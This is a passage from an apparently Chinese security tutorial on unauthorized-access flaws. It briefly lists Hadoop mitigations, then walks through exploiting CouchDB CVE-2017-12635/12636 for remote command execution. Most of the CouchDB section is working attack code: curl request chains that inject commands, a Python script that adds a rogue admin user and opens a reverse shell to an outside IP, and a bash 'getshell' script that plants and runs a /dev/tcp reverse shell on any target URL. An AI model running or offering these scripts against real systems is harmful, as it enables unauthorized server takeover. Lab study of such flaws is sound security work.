requests.post(url, json=data)</code></pre><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.4525790349417637" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/27_eaRTP6zFex119eoLtKVEKQydtISTMA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUU4sK2WibcvNxb8lyFhdSVzicfmeaRTP6zFex119eoLtKVEKQydtISTMA/640?wx_fmt=png'" data-type="png" data-w="2404" style=""  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3. 防范措施</strong><br  /></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>1. 网络访问控制</em><br  />使用 安全组防火墙 或本地操作系统防火墙对访问源 IP 进行控制。如果您的 Hadoop 环境仅对内网服务器提供服务，建议不要将 Hadoop 服务所有端口发布到互联网。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>2. 启用认证功能</em><br  />启用 Kerberos 认证功能。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>3. 更新补丁</em><br  />不定期关注 Hadoop 官方发布的最新版本，并及时更新补丁。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x08 CouchDB未授权访问</h2><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">介绍</h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。<br  />CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，query_server在配置文件local.ini中的格式：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">[query_servers]
LANGUAGE = PATH ARGS
默认情况下，配置文件中已经设置了两个query_servers:

[query_servers]
javascript = /usr/bin/couchjs /usr/share/couchdb/server/main.js
coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">可以看到，CouchDB在query_server中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就可以利用数据库来执行命令了</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。<br  />http://bobao.360.cn/learning/detail/4716.html<br  />https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">影响版本：小于 1.7.0 以及 小于 2.1.1</code></em></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.扫描探测</strong></h4><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">nmap</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-p</span> 5984 <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 52px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">--script</span> "<span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 85px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">couchdb-stats</span><span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 27px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.nse</span>" 127<span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.0</span><span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.0</span><span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.1</span></code></pre></section><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.48613376835236544" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/28_KD001XeGkfUI7B8CjDV8pbiaDuYMLQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBU3FRRJXJxaQyWWPFfV54LA9y4XKD001XeGkfUI7B8CjDV8pbiaDuYMLQ/640?wx_fmt=png'" data-type="png" data-w="2452" style=""  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.两个版本的利用方式</strong><br  /></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><em>(1) 1.6.0 下的说明</em></strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">依次执行如下请求即可触发任意命令执行,其中,vulhub:vulhub为管理员账号密码。</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '"id &gt;/tmp/success"'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'</code></pre><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.5995975855130785" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/29_K7y4NQUibM0lFBu3gtmGeQ51FMuueQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUBSQUibkoOTLPqq8MhraibLGsQZTK7y4NQUibM0lFBu3gtmGeQ51FMuueQ/640?wx_fmt=png'" data-type="png" data-w="1988" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">第一个请求是添加一个名字为cmd的query_servers，其值为<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">id &gt;/tmp/success</code>，这就是我们后面待执行的命令。<br  />第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。<br  />第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。<br  /></p><hr style="margin-top: 15px;margin-bottom: 15px;border-top: 0px;border-right: 0px;border-left: 0px;border-bottom-style: solid;border-bottom-color: rgb(221, 221, 221);box-sizing: content-box;height: 0px;background: rgb(255, 255, 255);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;"  /><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><em>(2) 2.1.0 下的说明</em></strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。<br  />Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问/_membership即可：</p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">curl http:<span class="hljs-default-comment" style="color: rgb(92, 99, 112);background: rgba(0, 0, 0, 0);display: inline;width: 264px;text-decoration: none solid rgb(92, 99, 112);font-weight: 400;font-style: italic;">//vulhub:vulhub@your-ip:5984/_membership</span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">可见，我们这里只有一个node，名字是nonode@nohost。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后，我们修改nonode@nohost的配置：</p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-attribute" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">curl</span> -X PUT http://vulhub:vulhub<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">@your</span>-ip:5984/_node/nonode<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 47px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">@nohost</span>/<span style="color: rgb(221, 17, 68);font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;letter-spacing: 0.75px;text-align: start;background-color: rgba(0, 0, 0, 0.04);">_config/query_servers/cmd -d '"id &gt;/tmp/success"'</span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json"</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">增加_view的同时即触发了query_servers中的命令。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.1 p牛的python脚本 支持高低版本,需要在version = 定义</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">##!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth

target = 'http://127.0.0.1:5984'
command = '"bash -i &gt;&amp; /dev/tcp/192.168.2.64/2222 0&gt;&amp;1"'
version = 2

session = requests.session()
session.headers = {
 &nbsp; &nbsp;'Content-Type': 'application/json'
}
## session.proxies = {
## &nbsp; &nbsp; 'http': 'http://127.0.0.1:8085'
## }
session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
 &nbsp;"type": "user",
 &nbsp;"name": "wooyun",
 &nbsp;"roles": ["_admin"],
 &nbsp;"roles": [],
 &nbsp;"password": "wooyun"
}''')

session.auth = HTTPBasicAuth('wooyun', 'wooyun')

if version == 1:
 &nbsp; &nbsp;session.put(target + ('/_config/query_servers/cmd'), data=command)
else:
 &nbsp; &nbsp;host = session.get(target + '/_membership').json()['all_nodes'][0]
 &nbsp; &nbsp;session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command)

session.put(target + '/wooyun')
session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')

if version == 1:
 &nbsp; &nbsp;session.post(target + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}')
else:
 &nbsp; &nbsp;session.put(target + '/wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.2 bash自动化脚本</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">##!/bin/bash

echo CouchDB getshell - c0debreak - tools.changesec.com
echo

if [[ $## -ne 2 ]];then
 &nbsp; &nbsp;echo Usage: $0 http://xx.xx.xx.xx:5984 myserver:myport
 &nbsp; &nbsp;exit 1
else
 &nbsp; &nbsp;server=$1
 &nbsp; &nbsp;cb=${2/:/\/}
fi

function run() {
 &nbsp; &nbsp;cmd=$1

 &nbsp; &nbsp;curl -XPUT "$server/_config/query_servers/cmd" -d "\"$cmd\""
 &nbsp; &nbsp;curl -XPUT "$server/example"
 &nbsp; &nbsp;curl -XPUT "$server/example/record" -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
 &nbsp; &nbsp;curl --max-time 1 "$server/example/_temp_view?limit=1" -d '{"language":"cmd", "map":""}' -H 'Content-Type: application/json'
}

run "echo '/bin/bash -i &gt;&amp; /dev/tcp/$cb 0&gt;&amp;1' &gt; /tmp/shell"
run "bash /tmp/shell"
run "rm -f /tmp/shell"

